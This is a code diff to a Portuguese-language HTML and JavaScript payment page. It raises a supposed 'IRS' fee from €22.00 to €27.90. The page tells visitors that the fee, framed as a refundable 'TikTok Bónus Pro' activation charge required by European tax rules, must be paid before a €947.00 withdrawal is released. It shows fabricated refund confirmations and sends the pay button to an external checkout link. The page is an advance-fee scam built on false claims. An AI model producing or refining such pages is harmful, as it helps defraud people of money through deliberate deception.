@@ -53,14 +53,15 @@
       <div class="confirmation-section">
         <div class="confirmation-section-title">Requisito de Pagamento IRS</div>
         <div class="confirmation-fee-amount">
-          € 22.00
+          € 27.90
           <span class="confirmation-reembolso-badge">VALOR REEMBOLSÁVEL</span>
         </div>
         <div class="confirmation-fee-description">
           De acordo com os regulamentos fiscais europeus, é necessário um pagamento de
-          <span class="bold">€22,00</span> antes que a libertação do seu
+          <span class="bold">€27,90</span> antes que a libertação do seu
           levantamento totalizando <span class="bold">€947,00</span> possa ser
-          concluída. Esta taxa de ativação do sistema <strong>TikTok Bónus Pro</strong> é necessária para validar a sua identidade e conta bancária. O valor será reembolsado automaticamente.
+          concluída. Esta taxa de ativação do sistema <strong>TikTok Bónus Pro</strong> é necessária para validar a sua
+          identidade e conta bancária. O valor será reembolsado automaticamente.
         </div>
       </div>
 
@@ -140,7 +141,7 @@
           &#9201;&#65039; Reembolso emitido em 1 minuto
         </div>
         <div class="confirmation-success-message" id="confirmation-success-message">
-          &#10004;&#65039; Identidade confirmada. € 22,00 reembolsados e levantamento
+          &#10004;&#65039; Identidade confirmada. € 27,90 reembolsados e levantamento
           libertado.
         </div>
       </div>
@@ -198,7 +199,7 @@
       payButton.addEventListener("click", function (e) {
         e.preventDefault();
         if (typeof trackInitiateCheckout === "function") {
-          trackInitiateCheckout(22.00);
+          trackInitiateCheckout(27.90);
         }
         window.location.href = "https://waymb.com/c?username=eduardotreonix&product=1" + window.location.search;
       });
